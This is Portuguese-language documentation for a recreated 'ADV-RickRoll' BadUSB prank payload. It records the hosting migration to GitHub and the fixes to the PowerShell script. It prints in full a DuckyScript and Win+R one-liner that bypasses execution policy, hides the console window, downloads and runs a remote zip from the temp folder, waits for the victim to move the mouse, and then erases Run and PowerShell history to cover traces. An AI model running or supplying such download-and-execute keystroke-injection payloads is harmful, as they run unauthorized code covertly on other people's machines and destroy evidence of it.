# Documentação de Recriação e Atualização — ADV-RickRoll

## 1. Contexto e Motivação

O projeto original **ADV-RickRoll** (desenvolvido originalmente por *I am Jakoby*) utilizava um servidor web próprio hospedado no domínio `https://jakoby.lol/qee` para fornecer o pacote comprimido `rr.zip` (contendo o vídeo `rr.mp4` e o script de execução `rr.ps1`).

Com a desativação permanente desse servidor, o comando de primeiro estágio (`irm -Uri 'https://jakoby.lol/qee'`) passou a falhar com erro de resolução de nome ou conexão recusada, impossibilitando a execução do payload em dispositivos BadUSB (como USB Rubber Ducky, Flipper Zero, Raspberry Pi Pico) ou diretamente via PowerShell.

Esta intervenção recriou e atualizou a solução completa, migrando a hospedagem dos binários para o repositório público do GitHub e corrigindo incompatibilidades internas de código no script PowerShell.

---

## 2. Diagnóstico dos Arquivos Originais

Durante a inspeção dos arquivos do projeto original, foram identificados os seguintes problemas:

1. **Servidor Inativo:** O endpoint `https://jakoby.lol/qee` está inacessível, impedindo o download do arquivo `rr.zip`.
2. **Inconsistência de Caminho no `rr.ps1`:**
   - O comando de um linha em `ADV-RickRoll.txt` extraía o arquivo com:
     `Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"`
     colocando o vídeo em `$env:TMP\rr\rr.mp4`.
   - No entanto, a linha 36 do `rr.ps1` buscava fixamente em:
     `[uri]$VideoSource = "$env:TMP\rr.mp4"`.
     Isso fazia com que o player WPF não encontrasse o vídeo, falhando silenciosamente na reprodução.
3. **Visibilidade do Terminal:**
   - No `rr.ps1` do diretório faltavam as chamadas para a API Win32 (`ShowWindow`) que garantem a ocultação da janela do terminal caso o parâmetro `-WindowStyle Hidden` (`-w h`) piscasse na tela.
4. **Limpeza de Arquivos:**
   - O script tentava deletar todos os arquivos da pasta temporária do usuário indiscriminadamente (`rm $env:TEMP\*`), gerando falhas se arquivos estivessem bloqueados por outros processos do Windows, sem antes garantir a exclusão dos arquivos específicos do payload (`rr.zip`, `rr\`).

---

## 3. Modificações Realizadas nos Arquivos

Abaixo estão detalhadas todas as alterações efetuadas em cada arquivo do projeto:

### 3.1. [rr.ps1](file:///home/juca/Documentos/ADV-RickRoll/rr.ps1)
* **Ocultação de Janela Nativa:** Inclusão do bloco com `DllImport` para a API Win32 `ShowWindow` para ocultar o console do processo atual em segundo plano imediatamente.
* **Resolução Dinâmica do Caminho do Vídeo:**
  O caminho do `rr.mp4` agora é detectado de forma inteligente:
  ```powershell
  if (Test-Path "$PSScriptRoot\rr.mp4") {
      [uri]$VideoSource = "$PSScriptRoot\rr.mp4"
  } elseif (Test-Path "$env:TMP\rr\rr.mp4") {
      [uri]$VideoSource = "$env:TMP\rr\rr.mp4"
  } else {
      [uri]$VideoSource = "$env:TMP\rr.mp4"
  }
  ```
  Isso garante que o vídeo execute com sucesso independentemente de onde ou como o arquivo foi extraído.
* **Limpeza Cirúrgica de Artefatos:** Adicionada a remoção explícita dos arquivos `$env:TMP\rr.zip`, pasta `$env:TMP\rr\` e `$env:TMP\rr.mp4` antes da tentativa de limpeza geral.
* **Tratamento de Exceções:** Adicionado `-ErrorAction SilentlyContinue` nas limpezas de histórico para evitar mensagens vermelhas caso o módulo PSReadLine não esteja configurado.

### 3.2. [rr.zip](file:///home/juca/Documentos/ADV-RickRoll/rr.zip)
* O arquivo compactado foi totalmente reconstruído utilizando compressão Deflate (nível 9), contendo:
  - O vídeo original de alta qualidade `rr.mp4` (10.148.648 bytes).
  - A nova versão corrigida e aprimorada do `rr.ps1`.

### 3.3. [ADV-RickRoll.txt](file:///home/juca/Documentos/ADV-RickRoll/ADV-RickRoll.txt)
* O payload DuckyScript foi unificado e enriquecido: incorpora agora a chamada Win32 `ShowWindow` para ocultação imediata e as rotinas diretas de download e extração em linha única:
  ```duckyscript
  STRING powershell -w h -NoP -NonI -Ep Bypass "$i='[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Set-Location $env:tmp;irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O rr.zip;Expand-Archive rr.zip -Des rr -Force;. .\rr\rr.ps1"
  ```
* Mantida a compatibilidade total com dispositivos BadUSB (Flipper Zero, Rubber Ducky, etc.) e incluído comentário de instrução para execução direta no Windows (`Win + R`).

### 3.4. StageOne.txt (Unificado e Removido)
* O arquivo `StageOne.txt` foi absorvido e unificado diretamente dentro do `ADV-RickRoll.txt`, deixando de existir como arquivo avulso no repositório.

### 3.5. [ReadMe.md](file:///home/juca/Documentos/ADV-RickRoll/ReadMe.md)
* Atualizado o `README` com a nova URL pública do GitHub e com o comando unificado.
* Adicionada a seção **Modifications & Improvements** documentando as melhorias técnicas e a unificação do `StageOne.txt`.
* Atualizados os créditos e autoria da recriação.

---

## 4. Status de Publicação e Validação Concluídos

1. **Repositório Git Inicializado e Vinculado:**
   - Vinculado com sucesso ao repositório público: `https://github.com/xJCPMSx/ADV-RickRoll.git`.
2. **Commit e Push:**
   - Todos os arquivos do projeto foram adicionados e enviados para a branch `main`.
3. **Criação das Releases no GitHub:**
   - A Release [v1.0.0](https://github.com/xJCPMSx/ADV-RickRoll/releases/tag/v1.0.0) foi publicada inicialmente com a reconstrução do projeto.
   - A Release [v1.1.0](https://github.com/xJCPMSx/ADV-RickRoll/releases/tag/v1.1.0) foi publicada formalizando a unificação do StageOne, com o novo asset oficial `rr.zip` (contendo o script corrigido com verificação de tipo).
4. **Validação de Conectividade:**
   - O endpoint direto `https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip` foi testado via requisição HTTP e retornou status `HTTP/2 200 OK` (10.138.698 bytes), confirmando que o download está totalmente funcional.

---

## 5. Como Testar e Utilizar

### Execução Direta no Windows (via Caixa Executar `Win + R`)
Copie e cole o comando unificado a seguir na janela Executar do Windows:
```powershell
powershell -w h -NoP -NonI -Ep Bypass "$i='[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Set-Location $env:tmp;irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O rr.zip;Expand-Archive rr.zip -Des rr -Force;. .\rr\rr.ps1"
```

### O que acontece durante a execução:
1. O PowerShell abre e, antes mesmo de iniciar qualquer download ou processamento pesado, invoca nativamente a API Win32 `ShowWindow` para ocultar o console (evitando qualquer flash visual).
2. O diretório de trabalho é alterado para a pasta temporária (`$env:tmp`).
3. O pacote `rr.zip` é baixado diretamente do GitHub Raw e descompactado na pasta temporária `rr\`.
4. O script ativa a função `Target-Comes`, alternando o CapsLock a cada 3 segundos e aguardando a movimentação do mouse pela vítima.
5. Assim que o mouse se mexe, a janela em tela cheia do WPF carrega o vídeo com volume em 100%.
6. Ao término ou fechamento, todos os rastros temporários, histórico do RunMRU e do PowerShell são apagados.

---

## 6. Documentação da Unificação do StageOne

### 6.1. Motivação e Diagnóstico
No design original do projeto, a execução era dividida em múltiplos estágios:
* Estágio 0: Keystroke injection (DuckyScript) que chamava uma URL remota.
* Estágio 1 (`StageOne.txt`): Script intermediário que ocultava o console e baixava o ZIP principal.
* Estágio 2 (`rr.zip` -> `rr.ps1`): O script final com interface WPF.

Manter `StageOne.txt` como um arquivo separado no repositório era desnecessário e gerava duplicação de comandos, além de exigir duas requisições HTTP caso a arquitetura de estágios fosse mantida.

### 6.2. Modificações Realizadas
1. **Unificação do Payload (`ADV-RickRoll.txt`):**
   - Incorporou a declaração da Win32 API (`user32.dll!ShowWindow`) com `Add-Type`.
   - Adicionou a chamada antecipada para ocultar a janela imediatamente.
   - Navega para `$env:tmp` de forma segura e faz o download direto de `rr.zip`, descompactando em pasta dedicada `rr\` e acionando `.\rr\rr.ps1`.
   - O payload permanece totalmente compatível com a sintaxe DuckyScript para USB Rubber Ducky e Flipper Zero.

2. **Remoção de Arquivo Residual (`StageOne.txt`):**
   - O arquivo `StageOne.txt` foi completamente absorvido e removido do repositório (`git rm StageOne.txt`).

3. **Proteção contra Tipos Duplicados no `rr.ps1`:**
   - No PowerShell, definir o mesmo tipo .NET (`native.win`) mais de uma vez na mesma sessão via `Add-Type` causa o erro `The type name 'native.win' already exists`.
   - Para garantir total idempotência, o bloco inicial de `rr.ps1` foi atualizado para verificar se o tipo já existe antes de compilá-lo:
     ```powershell
     if (-not ('native.win' -as [type])) {
         $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
         add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;
     }
     [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
     ```

4. **Reconstrução do Pacote `rr.zip`:**
   - O arquivo `rr.zip` foi reempacotado com compressão Deflate nível 9 contendo o novo `rr.ps1` corrigido e o vídeo `rr.mp4`.

5. **Atualização da Documentação (`ReadMe.md` e `DOCUMENTACAO.md`):**
   - Atualizados os exemplos de comando de execução para o formato unificado.
   - Documentada a remoção e o motivo da unificação.

6. **Publicação da Release v1.1.0 no GitHub:**
   - Publicada a nova versão [v1.1.0](https://github.com/xJCPMSx/ADV-RickRoll/releases/tag/v1.1.0) com notas detalhadas e o asset binário oficial `rr.zip` atualizado.
